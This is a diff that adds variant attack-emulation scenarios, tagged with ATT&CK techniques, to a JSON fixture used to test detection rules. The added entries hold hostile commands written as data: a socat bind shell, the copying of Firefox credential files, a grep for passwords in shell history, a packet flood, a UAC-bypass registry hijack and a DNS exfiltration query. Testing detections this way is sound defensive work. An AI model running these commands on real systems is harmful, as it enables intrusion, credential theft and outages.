@@ -4006,6 +4006,525 @@
    "expect": [
     "T1195.002"
    ]
+  },
+  {
+   "id": "emu-t1110-bruteforce-single-account",
+   "name": "Single-account SSH brute force",
+   "description": "Variant scenario: second, differently-worded emulation of T1110 measuring that the rule is not tied to one sample. Data only.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1110"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "auth",
+     "user": "root",
+     "source_ip": "198.51.100.77",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "root",
+     "source_ip": "198.51.100.77",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "root",
+     "source_ip": "198.51.100.77",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "root",
+     "source_ip": "198.51.100.77",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "root",
+     "source_ip": "198.51.100.77",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "root",
+     "source_ip": "198.51.100.77",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "root",
+     "source_ip": "198.51.100.77",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "root",
+     "source_ip": "198.51.100.77",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "root",
+     "source_ip": "198.51.100.77",
+     "method": "ssh",
+     "outcome": "failure"
+    }
+   ],
+   "expect": [
+    "T1110"
+   ]
+  },
+  {
+   "id": "emu-t1110-003-password-spray-variant",
+   "name": "Password spray across many accounts",
+   "description": "Variant scenario: second, differently-worded emulation of T1110.003 measuring that the rule is not tied to one sample. Data only.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1110.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "auth",
+     "user": "a1",
+     "source_ip": "203.0.113.50",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "b2",
+     "source_ip": "203.0.113.50",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "c3",
+     "source_ip": "203.0.113.50",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "d4",
+     "source_ip": "203.0.113.50",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "e5",
+     "source_ip": "203.0.113.50",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "f6",
+     "source_ip": "203.0.113.50",
+     "method": "ssh",
+     "outcome": "failure"
+    }
+   ],
+   "expect": [
+    "T1110.003"
+   ]
+  },
+  {
+   "id": "emu-t1021-006-winrs-variant",
+   "name": "winrs remote command",
+   "description": "Variant scenario: second, differently-worded emulation of T1021.006 measuring that the rule is not tied to one sample. Data only.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Lateral Movement"
+   ],
+   "techniques": [
+    "T1021.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\winrs.exe",
+     "command": "winrs -r:srv07 -u:corp\\adm -p:x ipconfig",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1021.006"
+   ]
+  },
+  {
+   "id": "emu-t1021-006-enter-pssession-variant",
+   "name": "Enter-PSSession to a server",
+   "description": "Variant scenario: second, differently-worded emulation of T1021.006 measuring that the rule is not tied to one sample. Data only.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Lateral Movement"
+   ],
+   "techniques": [
+    "T1021.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "command": "powershell -c Enter-PSSession -ComputerName fs01 -Credential corp\\adm",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1021.006"
+   ]
+  },
+  {
+   "id": "emu-t1059-007-wscript-js-variant",
+   "name": "wscript running a JScript loader from Temp",
+   "description": "Variant scenario: second, differently-worded emulation of T1059.007 measuring that the rule is not tied to one sample. Data only.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1059.007"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\wscript.exe",
+     "command": "wscript //B C:\\Users\\bob\\AppData\\Local\\Temp\\order.jse",
+     "parent_exe": "C:\\Windows\\explorer.exe"
+    }
+   ],
+   "expect": [
+    "T1059.007"
+   ]
+  },
+  {
+   "id": "emu-t1074-001-tar-stage-variant",
+   "name": "tar into hidden staging dir",
+   "description": "Variant scenario: second, differently-worded emulation of T1074.001 measuring that the rule is not tied to one sample. Data only.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Collection"
+   ],
+   "techniques": [
+    "T1074.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/tar",
+     "command": "tar czf /dev/shm/.cache/docs.tgz /home/ann/Documents",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1074.001"
+   ]
+  },
+  {
+   "id": "emu-t1095-socat-exec-variant",
+   "name": "socat bind shell",
+   "description": "Variant scenario: second, differently-worded emulation of T1095 measuring that the rule is not tied to one sample. Data only.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Command and Control"
+   ],
+   "techniques": [
+    "T1095"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/socat",
+     "command": "socat TCP4-LISTEN:7777,reuseaddr,fork EXEC:/bin/bash,pty,stderr",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1095"
+   ]
+  },
+  {
+   "id": "emu-t1135-net-view-variant",
+   "name": "net view on a file server",
+   "description": "Variant scenario: second, differently-worded emulation of T1135 measuring that the rule is not tied to one sample. Data only.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1135"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\net.exe",
+     "command": "net view \\\\fs01 /all",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1135"
+   ]
+  },
+  {
+   "id": "emu-t1498-nping-flood-variant",
+   "name": "nping high-rate flood",
+   "description": "Variant scenario: second, differently-worded emulation of T1498 measuring that the rule is not tied to one sample. Data only.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Impact"
+   ],
+   "techniques": [
+    "T1498"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/nping",
+     "command": "nping --tcp --rate 90000 -c 1000000 10.0.0.5",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1498"
+   ]
+  },
+  {
+   "id": "emu-t1529-poweroff-variant",
+   "name": "poweroff",
+   "description": "Variant scenario: second, differently-worded emulation of T1529 measuring that the rule is not tied to one sample. Data only.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Impact"
+   ],
+   "techniques": [
+    "T1529"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/sbin/poweroff",
+     "command": "poweroff",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1529"
+   ]
+  },
+  {
+   "id": "emu-t1580-gcloud-enum-variant",
+   "name": "gcloud instance list",
+   "description": "Variant scenario: second, differently-worded emulation of T1580 measuring that the rule is not tied to one sample. Data only.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1580"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/gcloud",
+     "command": "gcloud compute instances list --format=json",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1580"
+   ]
+  },
+  {
+   "id": "emu-t1651-az-run-command-variant",
+   "name": "az vm run-command",
+   "description": "Variant scenario: second, differently-worded emulation of T1651 measuring that the rule is not tied to one sample. Data only.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1651"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/az",
+     "command": "az vm run-command invoke -g rg1 -n vm1 --command-id RunShellScript --scripts 'id'",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1651"
+   ]
+  },
+  {
+   "id": "emu-t1552-003-root-history-variant",
+   "name": "root greps another user's history",
+   "description": "Variant scenario: second, differently-worded emulation of T1552.003 measuring that the rule is not tied to one sample. Data only.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1552.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/grep",
+     "command": "grep -i password /home/dev/.zsh_history",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1552.003"
+   ]
+  },
+  {
+   "id": "emu-t1555-003-firefox-creds-variant",
+   "name": "copy Firefox logins.json and key4.db",
+   "description": "Variant scenario: second, differently-worded emulation of T1555.003 measuring that the rule is not tied to one sample. Data only.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1555.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/cp",
+     "command": "cp /home/ann/.mozilla/firefox/ab12.default/logins.json /home/ann/.mozilla/firefox/ab12.default/key4.db /tmp/",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1555.003"
+   ]
+  },
+  {
+   "id": "emu-t1548-002-eventvwr-variant",
+   "name": "mscfile hijack for eventvwr bypass",
+   "description": "Variant scenario: second, differently-worded emulation of T1548.002 measuring that the rule is not tied to one sample. Data only.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Privilege Escalation"
+   ],
+   "techniques": [
+    "T1548.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "registry",
+     "key": "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command",
+     "operation": "create",
+     "value_data": "C:\\Users\\bob\\AppData\\Local\\Temp\\x.exe"
+    }
+   ],
+   "expect": [
+    "T1548.002"
+   ]
+  },
+  {
+   "id": "emu-t1568-002-dga-variant",
+   "name": "DGA-like AAAA lookups on .xyz",
+   "description": "Variant scenario: second, differently-worded emulation of T1568.002 measuring that the rule is not tied to one sample. Data only.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Command and Control"
+   ],
+   "techniques": [
+    "T1568.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "dns",
+     "query": "wqxzbtrkpmvdnh.xyz",
+     "qtype": "AAAA"
+    }
+   ],
+   "expect": [
+    "T1568.002"
+   ]
+  },
+  {
+   "id": "emu-t1048-003-dns-exfil-variant",
+   "name": "DNS exfil with CNAME hex labels",
+   "description": "Variant scenario: second, differently-worded emulation of T1048.003 measuring that the rule is not tied to one sample. Data only.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Exfiltration"
+   ],
+   "techniques": [
+    "T1048.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "dns",
+     "query": "deadbeefcafebabe0123456789ab.d.exf.example",
+     "qtype": "CNAME"
+    }
+   ],
+   "expect": [
+    "T1048.003"
+   ]
   }
  ]
 }
